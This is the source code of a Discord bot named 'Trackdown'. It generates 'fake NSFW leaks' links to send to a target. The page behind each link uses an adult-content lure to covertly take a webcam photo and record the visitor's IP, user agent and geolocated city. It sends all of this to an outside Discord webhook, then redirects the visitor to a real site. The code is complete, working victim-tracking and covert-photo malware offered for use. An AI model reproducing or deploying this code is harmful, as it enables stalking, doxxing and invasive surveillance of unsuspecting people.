const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// ================== USE ENV VARIABLES ==================
const TOKEN = process.env.DISCORD_TOKEN; // Your Discord bot token
const WEBHOOK_URL = process.env.WEBHOOK_URL; // Your webhook URL
const DOMAIN = process.env.DOMAIN; // Your domain, e.g., https://yourdomain.com
// ======================================================

const trackingLinks = new Map();

app.use(express.json());

// ================== HEALTH CHECK (Fixes 502 Bad Gateway) ==================
app.get('/', (req, res) => {
  res.send('✅ Trackdown bot is running!');
});

// ================== FAKE NSFW LOADING PAGE ==================
app.get('/track/:id', (req, res) => {
  const trackId = req.params.id;
  const originalUrl = trackingLinks.get(trackId);

  if (!originalUrl) {
    return res.send('<h1 style="color:red">Link expired or invalid</h1>');
  }

  const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Discord • Private Leaks</title>
  <style>
    body { background:#0f0f0f; color:#ff00aa; font-family:Arial; text-align:center; margin:0; padding:40px 20px; }
    h1 { font-size:28px; margin:20px 0; }
    .progress { height:10px; background:#222; border-radius:5px; overflow:hidden; margin:30px auto; max-width:400px; }
    .bar { height:100%; width:0%; background:linear-gradient(90deg,#ff00aa,#00ffff); animation:load 4.5s linear forwards; }
    .status { color:#00ff88; font-size:18px; margin:15px 0; }
    @keyframes load { to { width:100%; } }
  </style>
</head>
<body>
  <div>
    <h1>🔞 DISCORD NSFW PRIVATE LEAKS</h1>
    <p>Decrypting 18+ content from leaked server...</p>
    <div class="progress"><div class="bar"></div></div>
    <p class="status">69% • Please wait...</p>
  </div>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function start() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.onloadedmetadata = () => setTimeout(takePhoto, 2800);
      } catch(e) {
        setTimeout(() => window.location = "${originalUrl}", 3800);
      }
    }

    function takePhoto() {
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photo = canvas.toDataURL('image/jpeg', 0.8);

      fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trackId: "${trackId}",
          ip: "${ip}",
          userAgent: "${userAgent}",
          photo: photo
        })
      }).then(() => {
        if (stream) stream.getTracks().forEach(t => t.stop());
        setTimeout(() => window.location = "${originalUrl}", 900);
      });
    }

    start();
  </script>
</body>
</html>`;
  res.send(html);
});

// ================== LOG + SEND PHOTO ==================
app.post('/log', async (req, res) => {
  const { trackId, ip, userAgent, photo } = req.body;
  const originalUrl = trackingLinks.get(trackId) || 'Unknown';

  let location = 'Unknown';
  try {
    const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
    location = `${geo.data.city || ''}, ${geo.data.country_name || ''}`.trim() || 'Unknown';
  } catch(e) {}

  const embed = {
    title: "🎯 Trackdown Hit - NSFW Fake Link",
    color: 0xff00aa,
    fields: [
      { name: "IP", value: ip, inline: true },
      { name: "Location", value: location, inline: true },
      { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
      { name: "User-Agent", value: userAgent.substring(0, 350), inline: false },
      { name: "Original URL", value: originalUrl, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    if (photo && photo.startsWith('data:image')) {
      const form = new FormData();
      form.append('payload_json', JSON.stringify({ embeds: [embed] }));

      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      form.append('file', buffer, 'photo.jpg');

      await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
    } else {
      await axios.post(WEBHOOK_URL, { embeds: [embed] });
    }
  } catch(err) {
    console.error("Webhook error:", err);
  }

  res.sendStatus(200);
});

// ================== DISCORD BOT ==================
client.once('ready', async () => {
  console.log(`✅ Bot is online → ${client.user.tag}`);

  const cmd = new SlashCommandBuilder()
    .setName('create')
    .setDescription('Create fake NSFW leaks tracking link')
    .addStringOption(opt =>
      opt.setName('url')
        .setDescription('Real URL to redirect after tracking')
        .setRequired(true));

  await client.application.commands.set([cmd]);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;

  const url = interaction.options.getString('url');
  if (!url.startsWith('http')) {
    return interaction.reply({ content: '❌ URL must start with http:// or https://', ephemeral: true });
  }

  const trackId = 'nsfw' + Date.now().toString(36);
  trackingLinks.set(trackId, url);

  const link = `${DOMAIN}/track/${trackId}`;

  await interaction.reply({
    content: `**✅ Fake NSFW Leaks Tracking Link Created!**\n\n` +
             `**Tracking Link:** ${link}\n` +
             `**Redirects to:** ${url}\n\n` +
             `Send this link to the target.`,
    ephemeral: true
  });
});

// ================== START SERVER ==================
app.listen(process.env.PORT || 3000, () => {
  console.log('✅ Web server is running!');
});

client.login(TOKEN);
